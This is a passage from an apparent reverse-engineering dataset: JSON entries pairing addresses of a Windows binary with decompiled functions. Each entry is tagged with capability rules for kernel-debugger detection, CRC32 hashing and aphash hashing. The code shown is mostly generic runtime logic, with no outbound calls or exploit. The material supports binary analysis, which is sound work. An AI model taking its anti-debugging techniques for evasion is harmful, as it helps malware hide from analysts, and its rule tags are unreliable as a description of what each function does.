fcn.00414230(&fcn.0041f060::var_28h);\n    var_4h_2._0_1_ = 2;\n    var_20h = var_24h;\n    uVar1 = fcn.00413530();\n    var_4h_2._0_1_ = 3;\n    fcn.00415e20(uVar1);\n    var_4h_2._0_1_ = 0;\n    fcn.004134f0();\n    pcVar2 = fcn.004142c0(var_ch_2);\n    if (*pcVar2 == '\\0') {\n        var_38h = fcn.00413b00(&fcn.0041f060::var_54h, var_4h_3);\n        var_4h_2 = 5;\n        var_14h_2 = var_14h_2 | 2;\n        var_34h = var_38h;\n        var_1ch = var_38h;\n    }\n    else {\n        iVar3 = fcn.004142c0(var_ch_2);\n        var_30h = fcn.00414060(iVar3 + 4);\n        var_4h_2 = CONCAT31(var_4h_2._1_3_, 4);\n        var_14h_2 = var_14h_2 | 1;\n        var_2ch = var_30h;\n        var_1ch = var_30h;\n    }\n    var_3ch = var_1ch;\n    fcn.00415df0(var_1ch);\n    var_4h_2 = 4;\n    if ((var_14h_2 & 2) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffd;\n        fcn.00413b60();\n    }\n    var_4h_2 = 0;\n    if ((var_14h_2 & 1) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffe;\n        fcn.00413b60();\n    }\n    fcn.0041f740(&fcn.0041f060::var_8h);\n    *in_FS_OFFSET = stack0xfffffff0;\n    return var_18h_2;\n}\n",
        "token_count": 1185
    },
    "0041f1f0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0041f1f0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint arg_8h)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_40h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStack120 [4];\n    uint uStack116;\n    uint *puStack112;\n    uint32_t uStack108;\n    uint var_64h;\n    uint var_54h;\n    uint var_44h;\n    uchar *puStack68;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h_2;\n    uint32_t var_14h_2;\n    int32_t var_dh;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x47193a;\n    unique0x00005080 = *in_FS_OFFSET;\n    uStack108 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0041f1f0::var_dh + 1;\n    var_14h_2 = 0;\n    puStack112 = 0x41f227;\n    fcn.00415f70();\n    var_4h_2 = 0;\n    puStack112 = &fcn.0041f1f0::var_8h;\n    uStack116 = 0x41f237;\n    fcn.00408580();\n    puStack68 = &stack0xffffff88;\n    var_44h = fcn.00414270(&stack0xffffff88);\n    var_4h_2._0_1_ = 1;\n    var_24h = fcn.00414230(&fcn.0041f1f0::var_28h);\n    var_4h_2._0_1_ = 2;\n    var_20h = var_24h;\n    uVar1 = fcn.00413530();\n    var_4h_2._0_1_ = 3;\n    fcn.00415e20(uVar1);\n    var_4h_2._0_1_ = 0;\n    fcn.004134f0();\n    pcVar2 = fcn.004142c0(var_ch_2);\n    if (*pcVar2 == '\\0') {\n        var_38h = fcn.00413b00(&fcn.0041f1f0::var_54h, var_4h_3);\n        var_4h_2 = 5;\n        var_14h_2 = var_14h_2 | 2;\n        var_34h = var_38h;\n        var_1ch = var_38h;\n    }\n    else {\n        iVar3 = fcn.004142c0(var_ch_2);\n        var_30h = fcn.00414060(iVar3 + 4);\n        var_4h_2 = CONCAT31(var_4h_2._1_3_, 4);\n        var_14h_2 = var_14h_2 | 1;\n        var_2ch = var_30h;\n        var_1ch = var_30h;\n    }\n    var_3ch = var_1ch;\n    fcn.00415df0(var_1ch);\n    var_4h_2 = 4;\n    if ((var_14h_2 & 2) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffd;\n        fcn.00413b60();\n    }\n    var_4h_2 = 0;\n    if ((var_14h_2 & 1) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffe;\n        fcn.00413b60();\n    }\n    fcn.0041f760(&fcn.0041f1f0::var_8h);\n    *in_FS_OFFSET = stack0xfffffff0;\n    return var_18h_2;\n}\n",
        "token_count": 1195
    },
    "0041fbc0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fbc0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0041fbf0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 83
    },
    "00420380": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420380(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.004200b0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 80
    },
    "5c452eb1": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl\nmethod.Concurrency::task_unsigned_char_::_InitialTaskHandle_void__class__lambda_5c452eb11e27b3b64aba3962247a1b66___struct_Concurrency::details::_TypeSelectorNoAsync_.virtual_0\n          (uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00420120();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 129
    },
    "004203e0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004203e0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.004202c0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "fa53acb6": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl\nmethod.Concurrency::task_unsigned_char_::_InitialTaskHandle_void__class__lambda_fa53acb66667864286b27edea89b1cc7___struct_Concurrency::details::_TypeSelectorNoAsync_.virtual_0\n          (uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00420330();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 125
    },
    "00425ac7": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425ac7(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint32_t var_28h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExW)(arg_8h, 0, &var_28h);\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else if (arg_ch != NULL) {\n        *arg_ch = (-((var_28h & 1) != 0) & 0xffffff6e) + 0x1ff;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 212
    },
    "00445fdb": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00445fdb(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if ((0 < *(in_ECX + 0x70)) && (*(in_ECX + 0x68) == arg_ch || *(in_ECX + 0x68) < arg_ch)) {\n        if ((*(in_ECX + 0x3c) == -1) || (*(in_ECX + 0x3c) <= *(in_ECX + 0x68))) {\n            return true;\n        }\n        if ((arg_8h == *(in_ECX + 0x34)) && (arg_ch == ((*(in_ECX + 0x34))[1] << 4) >> 4)) {\n            iVar3 = *(in_ECX + 0x38);\ncode_r0x00446028:\n            if (iVar3 != 2) {\n                return *(iVar3 + 8) != 0;\n            }\n        }\n        else {\n            do {\n                if ((arg_8h == *(in_ECX + 0x30)) || (iVar3 = (arg_8h[1] << 4) >> 4,  iVar3 == arg_ch)) break;\n                if (iVar3 == -1) {\n                    arg_8h = NULL;\n                }\n                else {\n                    arg_8h = *arg_8h;\n                }\n            } while (arg_8h != NULL);\ncode_r0x0044609f:\n            if (arg_8h != NULL) {\n                if ((arg_8h == *(in_ECX + 0x30)) || (iVar3 = fcn.0044e4e4(0),  iVar3 != 0)) {\n                    if (arg_8h == NULL) {\n                        return false;\n                    }\n                    if (arg_8h == *(in_ECX + 0x30)) {\n                        return false;\n                    }\n                    iVar3 = fcn.0044e4e4(0);\n                    goto code_r0x00446028;\n                }\n                uVar1 = arg_8h[1] >> 0x1c & 1;\n                if ((uVar1 != 0) && ((*(arg_8h + 6) & 3) != 0)) {\n                    return true;\n                }\n                if ((uVar1 == 0) && (cVar2 = fcn.0044709c(),  cVar2 != '\\0')) {\n                    return true;\n                }\n                if ((arg_8h[1] & 0xfffffff) == 0xfffffff) {\n                    arg_8h = NULL;\n                }\n                else {\n                    arg_8h = *arg_8h;\n                }\n                goto code_r0x0044609f;\n            }\n        }\n    }\n    return false;\n}\n",
        "token_count": 645
    },
    "0044fdf3": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044fdf3(uint *arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t arg_8h_00;\n    int32_t iVar9;\n    uint32_t *in_ECX;\n    int32_t iVar10;\n    ulong uVar11;\n    uint32_t in_stack_ffffff98;\n    uint var_50h;\n    uint var_44h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar2 = false;\n    cVar4 = fcn.0044fbff(arg_8h);\n    if (cVar4 == '\\0') {\n        in_stack_ffffff98 = 0x44fe30;\n        uVar11 = fcn.0043d380();\n        var_18h = uVar11 >> 0x20;\n        uVar5 = uVar11;\n        in_ECX[5] = var_18h;\n        in_ECX[4] = uVar5;\n        uVar1 = *(in_ECX[1] + 0x1a0);\n        if ((var_18h - *(in_ECX[1] + 0x1a4) != uVar5 < uVar1) || (2000 < uVar5 - uVar1)) {\n            in_stack_ffffff98 = var_18h;\n            fcn.00444087(uVar5, var_18h);\n        }\n        uVar1 = in_ECX[4];\n        if ((in_ECX[5] - in_ECX[7] != uVar1 < in_ECX[6]) || (1000 < uVar1 - in_ECX[6])) {\n            in_ECX[6] = uVar1;\n            in_ECX[7] = in_ECX[5];\n            if (*(in_ECX[1] + 0x130) != 0) {\n                piVar6 = fcn.004434f0();\n                while (piVar6 != NULL) {\n                    if (*piVar6 == 0) {\n                        cVar4 = fcn.0044fc3d(piVar6 + -0x44, arg_8h, arg_10h, arg_14h);\n                        if (cVar4 != '\\0') {\ncode_r0x0044fef6:\n                            bVar2 = true;\n                            break;\n                        }\n                    }\n                    else if (((arg_14h & 1) != 0) && (iVar7 = fcn.00450c42(),  iVar7 != 0)) {\n                        puVar8 = fcn.0044f6eb(iVar7);\n                        *arg_8h = *puVar8;\n                        arg_8h[1] = puVar8[1];\n                        arg_8h[2] = puVar8[2];\n                        goto code_r0x0044fef6;\n                    }\n                    piVar6 = fcn.004434f0();\n                }\n            }\n            *(*in_ECX + 0x62) = 1;\n        }\n        iVar7 = *(*in_ECX + 0x54);\n        if (!bVar2) {\n            if (((*(*in_ECX + 0x60) == '\\0') && (cVar4 = fcn.00449cb2(),  cVar4 == '\\0')) && (arg_10h == '\\0')) {\n                iVar10 = 1;\n            }\n            else {\n                iVar10 = 0;\n            }\n            var_18h._1_3_ = uVar11 >> 0x28;\n            var_18h = CONCAT31(var_18h._1_3_, 1);\n            bVar3 = bVar2;\n            do {\n                iVar9 = iVar7;\n                var_24h = arg_ch;\n                if (2 < iVar10) break;\n                for (; iVar9 != 0; iVar9 = fcn.00443561(iVar7, iVar9)) {\n                    arg_8h_00 = fcn.0044f711(in_ECX[2]);\n                    if ((arg_8h_00 != 0) &&\n                       (in_stack_ffffff98 = arg_10h,  cVar4 = fcn.0044fc3d(arg_8h_00, arg_8h_00, arg_10h, arg_14h), \n                       cVar4 != '\\0')) {\ncode_r0x00450115:\n                        bVar3 = true;\n                        bVar2 = bVar3;\n                        break;\n                    }\n                    if ((var_18h != '\\0') && ((arg_14h & 1) != 0)) {\n                        in_stack_ffffff98 = *in_ECX;\n                        cVar4 = fcn.0044f7e9(arg_8h, in_stack_ffffff98, 0);\n                        if (cVar4 != '\\0') goto code_r0x00450115;\n                    }\n                    if (((((arg_14h & 1) != 0) &&\n                         (in_stack_ffffff98 = arg_14h, \n                         cVar4 = fcn.00450504(arg_8h, iVar9, var_24h, var_18h, arg_8h, arg_14h, arg_10h),  cVar4 != '\\0'\n                         )) || (((arg_14h & 10) != 0 &&\n                                (in_stack_ffffff98 = arg_14h, \n                                cVar4 = fcn.00450406(arg_8h, iVar9, var_24h, arg_14h >> 1 & 1, arg_8h, arg_14h, arg_10h)\n                                ,  cVar4 != '\\0')))) ||\n                       (((arg_14h & 0x14) != 0 &&\n                        (in_stack_ffffff98 = arg_14h, \n                        cVar4 = fcn.00450614(arg_8h, iVar9, var_24h, arg_14h >> 2 & 1, arg_8h, arg_14h, arg_10h), \n                        cVar4 != '\\0')))) goto code_r0x00450115;\n                    if (((arg_14h & 1) != 0) && (iVar10 == 2)) {\n                        in_stack_ffffff98 = *(iVar9 + 4);\n                        cVar4 = fcn.00450bc1(arg_8h, in_stack_ffffff98, *in_ECX);\n                        if (cVar4 != '\\0') goto code_r0x00450115;\n                    }\n                    var_24h = 0;\n                    var_18h = var_18h & 0xffffff00;\n                    bVar3 = bVar2;\n                }\n                iVar10 = iVar10 + 1;\n            } while (!bVar3);\n            if (!bVar3) goto code_r0x00450104;\n        }\n        uVar5 = var_18h;\n        uVar1 = in_ECX[5];\n        iVar10 = arg_8h[1];\n        iVar9 = *(iVar10 + 8);\n        if (100 < in_ECX[4] - *(iVar10 + 0x108)) {\n            *(iVar10 + 0x108) = in_ECX[4];\n            *(iVar10 + 0x10c) = uVar1;\n        }\n        var_18h = var_18h & 0xffffff00;\n        if ((*(iVar10 + 0xc) & 0xfffffff) != 0) {\n            fcn.0044546b(*in_ECX + 0x94);\n            cVar4 = fcn.0044f69f(iVar10 + 0xc);\n            if (cVar4 != '\\0') {\n                var_18h._1_3_ = SUB43(uVar5, 1);\n                var_18h = CONCAT31(var_18h._1_3_, 1);\n            }\n        }\n        fcn.0044a6fc(var_18h, iVar9 == iVar7);\n    }\ncode_r0x00450104:\n    fcn.0043a2e7(in_stack_ffffff98);\n    return;\n}\n",
        "token_count": 1943
    },
    "0045011f": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0045011f(uint *arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uint32_t arg_8h_00;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t arg_ch_00;\n    uint32_t *in_ECX;\n    int32_t iVar9;\n    ulong uVar10;\n    uint32_t in_stack_ffffffa8;\n    uint var_40h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar2 = false;\n    cVar4 = fcn.0044fbff(arg_8h);\n    if (cVar4 == '\\0') {\n        in_stack_ffffffa8 = 0x45015a;\n        uVar10 = fcn.0043d380();\n        arg_8h_00 = uVar10;\n        in_ECX[5] = uVar10 >> 0x20;\n        in_ECX[4] = arg_8h_00;\n        uVar8 = in_ECX[5];\n        uVar1 = *(in_ECX[1] + 0x1a0);\n        if ((uVar8 - *(in_ECX[1] + 0x1a4) != arg_8h_00 < uVar1) || (2000 < arg_8h_00 - uVar1)) {\n            in_stack_ffffffa8 = uVar8;\n            fcn.00444087(arg_8h_00, uVar8);\n        }\n        uVar1 = in_ECX[4];\n        if ((in_ECX[5] - in_ECX[7] != uVar1 < in_ECX[6]) || (1000 < uVar1 - in_ECX[6])) {\n            in_ECX[6] = uVar1;\n            in_ECX[7] = in_ECX[5];\n            if (*(in_ECX[1] + 0x130) != 0) {\n                do {\n                    while( true ) {\n                        piVar6 = fcn.004434f0();\n                        if (piVar6 == NULL) goto code_r0x00450223;\n                        if (*piVar6 != 0) break;\n                        cVar4 = fcn.0044fcaa(piVar6 + -0x44, arg_8h, arg_10h, arg_14h);\n                        if (cVar4 != '\\0') goto code_r0x0045021f;\n                    }\n                } while (((arg_14h & 1) == 0) || (iVar5 = fcn.00450c42(),  iVar5 == 0));\n                puVar7 = fcn.0044f6eb(iVar5);\n                *arg_8h = *puVar7;\n                arg_8h[1] = puVar7[1];\n                arg_8h[2] = puVar7[2];\ncode_r0x0045021f:\n                bVar2 = true;\n            }\ncode_r0x00450223:\n            *(*in_ECX + 0x62) = 1;\n        }\n        iVar5 = *(*in_ECX + 0x54);\n        if (!bVar2) {\n            if (((*(*in_ECX + 0x60) == '\\0') && (cVar4 = fcn.00449cb2(),  cVar4 == '\\0')) && (arg_10h == '\\0')) {\n                iVar9 = 1;\n            }\n            else {\n                iVar9 = 0;\n            }\n            var_1ch = CONCAT31(uVar8 >> 8, 1);\n            bVar3 = bVar2;\n            do {\n                if (2 < iVar9) break;\n                var_24h = arg_ch;\n                if (iVar5 != 0) {\n                    arg_ch_00 = iVar5;\n                    do {\n                        if (((((arg_14h & 0x14) != 0) &&\n                             (in_stack_ffffffa8 = arg_14h, \n                             cVar4 = fcn.00450614(arg_8h, arg_ch_00, var_24h, arg_14h >> 2 & 1, arg_8h, arg_14h, arg_10h\n                                                 ),  cVar4 != '\\0')) ||\n                            (((arg_14h & 10) != 0 &&\n                             (in_stack_ffffffa8 = arg_14h, \n                             cVar4 = fcn.00450406(arg_8h, arg_ch_00, var_24h, arg_14h >> 1 & 1, arg_8h, arg_14h, arg_10h\n                                                 ),  cVar4 != '\\0')))) ||\n                           ((uVar8 = arg_14h & 1,  uVar8 != 0 &&\n                            (in_stack_ffffffa8 = arg_14h, \n                            cVar4 = fcn.00450504(arg_8h, arg_ch_00, var_24h, var_1ch, arg_8h, arg_14h, arg_10h), \n                            cVar4 != '\\0')))) {\ncode_r0x00450387:\n                            bVar2 = true;\n                            bVar3 = true;\n                            break;\n                        }\n                        if ((uVar8 != 0) && (iVar9 == 2)) {\n                            in_stack_ffffffa8 = *(arg_ch_00 + 4);\n                            cVar4 = fcn.00450bc1(arg_8h, in_stack_ffffffa8, *in_ECX);\n                            if (cVar4 != '\\0') goto code_r0x00450387;\n                        }\n                        if ((var_1ch != '\\0') && (uVar8 != 0)) {\n                            in_stack_ffffffa8 = *in_ECX;\n                            cVar4 = fcn.0044f7e9(arg_8h, in_stack_ffffffa8, 1);\n                            if (cVar4 != '\\0') goto code_r0x00450387;\n                        }\n                        var_1ch = var_1ch & 0xffffff00;\n                        var_24h = 0;\n                        arg_ch_00 = fcn.00443561(iVar5, arg_ch_00);\n                        bVar3 = bVar2;\n                    } while (arg_ch_00 != 0);\n                }\n                iVar9 = iVar9 + 1;\n            } while (!bVar3);\n            if (!bVar3) goto code_r0x004503f4;\n        }\n        iVar9 = arg_8h[1];\n        uVar8 = in_ECX[5];\n        piVar6 = iVar9 + 8;\n        if (100 < in_ECX[4] - *(iVar9 + 0x108)) {\n            *(iVar9 + 0x108) = in_ECX[4];\n            *(iVar9 + 0x10c) = uVar8;\n            iVar9 = arg_8h[1];\n        }\n        fcn.0044a6fc(1 - ((*(iVar9 + 0xc) & 0xfffffff) != 0), *piVar6 == iVar5);\n    }\ncode_r0x004503f4:\n    fcn.0043a2e7(in_stack_ffffffa8);\n    return;\n}\n",
        "token_count": 1751
    },
    "004540e5": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __cdecl fcn.004540e5(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    bool bVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint8_t *puVar10;\n    int32_t *piVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    uVar12 = 0;\n    var_8h = NULL;\n    piVar11 = NULL;\n    var_1ch = NULL;\n    var_ch = NULL;\n    iVar1 = *(*(arg_ch + 0x10) + 0xc);\n    uVar2 = *(*(arg_ch + 0x10) + 8);\n    var_14h = 0;\n    var_10h = 0xffffffff;\n    bVar4 = true;\n    var_18h = -1;\n    if (uVar2 == 0) {\n        return NULL;\n    }\n    do {\n        piVar3 = *(iVar1 + uVar12 * 4);\n        if (var_14h < uVar12 - var_10h) {\n            if (*piVar3 != arg_18h) {\n                puVar10 = arg_18h + 8;\n                puVar5 = *piVar3 + 8;\n                do {\n                    uVar9 = *puVar5;\n                    bVar13 = uVar9 < *puVar10;\n                    if (uVar9 != *puVar10) {\ncode_r0x00454161:\n                        uVar6 = -bVar13 | 1;\n                        goto code_r0x00454166;\n                    }\n                    if (uVar9 == 0) break;\n                    uVar9 = puVar5[1];\n                    bVar13 = uVar9 < puVar10[1];\n                    if (uVar9 != puVar10[1]) goto code_r0x00454161;\n                    puVar5 = puVar5 + 2;\n                    puVar10 = puVar10 + 2;\n                } while (uVar9 != 0);\n                uVar6 = 0;\ncode_r0x00454166:\n                if (uVar6 != 0) goto code_r0x0045417f;\n            }\n            if ((*(piVar3 + 5) & 3) == 0) {\n                var_1ch = piVar3;\n            }\n            var_14h = piVar3[1];\n            var_10h = uVar12;\n            var_ch = piVar3;\n        }\ncode_r0x0045417f:\n        iVar8 = var_18h;\n        if (*piVar3 == arg_10h) {\ncode_r0x004541bb:\n            iVar7 = fcn.0045429b(arg_8h, piVar3 + 2);\n            if (iVar7 != arg_14h) goto code_r0x0045425b;\n            if (uVar12 - var_10h <= var_14h) {\n                if (bVar4) {\n                    if ((*(var_ch + 5) & 0x40) == 0) {\n                        if (var_10h == 0) {\n                            bVar4 = bVar4 & ~((*(piVar3 + 5) & 1) != 0);\n                        }\n                        uVar9 = 1;\n                    }\n                    else {\n                        uVar6 = *(*(*(var_ch[6] + 0xc) + (uVar12 - var_10h) * 4) + 0x14);\n                        uVar9 = ~(uVar6 >> 2) & 1;\n                        bVar4 = bVar4 & ~((uVar6 & 1) != 0);\n                    }\n                    if ((((bVar4) && (uVar9 != 0)) &&\n                        (iVar8 = fcn.0045429b(arg_8h, var_ch + 2),  bVar13 = piVar11 != NULL,  piVar11 = var_ch,  bVar13\n                        )) && (var_18h != iVar8)) {\n                        return NULL;\n                    }\n                }\n                goto code_r0x0045425b;\n            }\n            if ((*(piVar3 + 5) & 5) != 0) goto code_r0x0045425b;\n        }\n        else {\n            puVar10 = arg_10h + 8;\n            puVar5 = *piVar3 + 8;\n            do {\n                uVar9 = *puVar5;\n                bVar13 = uVar9 < *puVar10;\n                if (uVar9 != *puVar10) {\ncode_r0x004541ae:\n                    uVar6 = -bVar13 | 1;\n                    goto code_r0x004541b3;\n                }\n                if (uVar9 == 0) break;\n                uVar9 = puVar5[1];\n                bVar13 = uVar9 < puVar10[1];\n                if (uVar9 != puVar10[1]) goto code_r0x004541ae;\n                puVar5 = puVar5 + 2;\n                puVar10 = puVar10 + 2;\n            } while (uVar9 != 0);\n            uVar6 = 0;\ncode_r0x004541b3:\n            if (uVar6 == 0) goto code_r0x004541bb;\ncode_r0x0045425b:\n            var_18h = iVar8;\n            piVar3 = var_8h;\n        }\n        var_8h = piVar3;\n        uVar12 = uVar12 + 1;\n        if (uVar2 <= uVar12) {\n            if ((bVar4) && (piVar11 != NULL)) {\n                return piVar11;\n            }\n            if ((var_8h != NULL) && (var_1ch != NULL)) {\n                return var_1ch;\n            }\n            return NULL;\n        }\n    } while( true );\n}\n",
        "token_count": 1474
    },
    "0045a3fd": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0045a3fd(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.0045652e();\n        *puVar1 = 0x16;\n        fcn.004559dd();\n        goto code_r0x0045a552;\n    }\n    fcn.004562ff(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.0045a850(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.0045aa3e();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x0045a52a;\ncode_r0x0045a577:\n                    